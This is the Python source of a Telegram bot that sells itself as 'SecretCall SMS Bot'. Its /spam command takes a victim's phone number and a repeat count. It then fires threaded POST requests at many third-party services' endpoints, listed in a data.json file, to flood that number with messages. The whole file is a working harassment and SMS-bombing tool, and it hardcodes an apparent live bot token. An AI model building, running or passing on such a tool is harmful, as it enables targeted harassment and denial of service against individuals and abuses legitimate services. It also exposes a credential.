from threading import Thread
import requests
import json
import sys
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging

__version__ = "1.3"

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Your Telegram bot token
TOKEN = "7618261878:AAGyoMuFThdLwOMbcBIR9W9rqo2wq2abVlA"

class BloodTrail:
    def __init__(self, number):
        try:
            with open("data.json", "r", encoding="utf-8") as f:
                self.data = json.load(f)
            if number == "":
                if self.data["last_used_number"]:
                    self.number = self.data["last_used_number"]
                    print(f"{'USING LATEST NUMBER :': >40} {self.data['last_used_number']}")
                else:
                    print(f"{'ERROR :': >40} write number as a target to save it")
                    sys.exit()
            else:
                self.number = number
                self.data["last_used_number"] = self.number
                with open("data.json", "w", encoding="utf-8") as j:
                    json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
        except FileNotFoundError:
            print(f"ERROR: data.json file not found.")
            sys.exit()

    def format_data(self):
        for service in self.data["services"]:
            for k, v in self.data["services"][service]["data"].items():
                if "%NUMBER%" in v:
                    v = v.replace("%NUMBER%", self.number[int(self.data["services"][service]["phone_f"]):])
                    self.data["services"][service]["data"][k] = v

    @staticmethod
    def post_request(service, url, data=None, json_data=None):
        if json_data:
            r = requests.post(url=url, json=json_data)
        else:
            r = requests.post(url=url, data=data)
        print(f"{'REQUEST STATUS OF ' + service + ' :': >40} {r.status_code}")

    def start_threads(self, repeats=1):
        threads = []
        for i in range(repeats):
            for service in self.data["services"]:
                data_type = self.data["services"][service]["data_type"]
                if data_type == "json":
                    t = Thread(target=self.post_request, args=(service,
                                                               self.data["services"][service]["url"],
                                                               None,
                                                               self.data["services"][service]["data"]))
                else:
                    t = Thread(target=self.post_request, args=(service,
                                                               self.data["services"][service]["url"],
                                                               self.data["services"][service]["data"],
                                                               None))
                threads.append(t)
                t.start()

        for thread in threads:
            thread.join()

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to SecretCall SMS Bot! Use /spam <phone_number> <repeats> to start spamming.")

# Function to handle the /spam command
async def spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /spam <phone_number> <repeats>")
            return

        number = args[0]
        repeats = int(args[1])

        # Run the BloodTrail class
        bloodtrail = BloodTrail(number)
        bloodtrail.format_data()
        bloodtrail.start_threads(repeats)

        await update.message.reply_text(f"Started spamming {number} for {repeats} times!")
    except Exception as e:
        logger.error(e)
        await update.message.reply_text("An error occurred. Please check your inputs.")

# Main function to run the bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("spam", spam))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()